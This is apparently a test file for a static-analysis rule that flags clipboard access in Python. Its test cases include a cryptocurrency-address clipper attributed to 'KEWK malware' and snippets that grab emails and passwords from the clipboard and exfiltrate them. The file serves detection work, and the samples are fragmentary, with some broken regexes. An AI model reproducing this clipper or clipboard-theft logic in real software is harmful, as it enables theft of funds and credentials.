""" Tests for clipboard-access rule

    RULEID cases:
      - KEWK malware
    No Clear OK cases
"""

""" RULEID: KEWK malware
"""
# ruleid: clipboard-access
clipboard_data = pyperclip.paste()
if re.search('^[13][a-km-zA-HJ-NP-21-9]{25, 34}$', clipboard_data):
    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain]:
        if self.address_btc != "none":
            # ruleid: clipboard-access
            pyperclip.copy(self.address_btc)
            # ruleid: clipboard-access
            pyperclip.paste()
if re.search('^Ox[a-fA-FO-9](40)$', clipboard_data):
    # ruleid: clipboard-access
    pyperclip.copy(self.address_eth)


""" RULEID: Find and replace email addresses with pyperclip
"""
# ruleid: clipboard-access
clipboard_data = pyperclip.paste()
matches = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', clipboard_data)
if matches:
    for email in matches:
        fake_email = generate_fake_email(email)
        clipboard_data = clipboard_data.replace(email, fake_email)
# Attacker exfiltrates modified data
exfiltrate_data(clipboard_data)


""" RULEID: Copy and overwrite clipboard with pandas
"""
import pandas as pd
# ruleid: clipboard-access
df = pd.read_clipboard()
# Assume there's some sensitive data in the DataFrame
sensitive_data = df["password"]
# ruleid: clipboard-access
df.to_clipboard()
exfiltrate_data(sensitive_data)




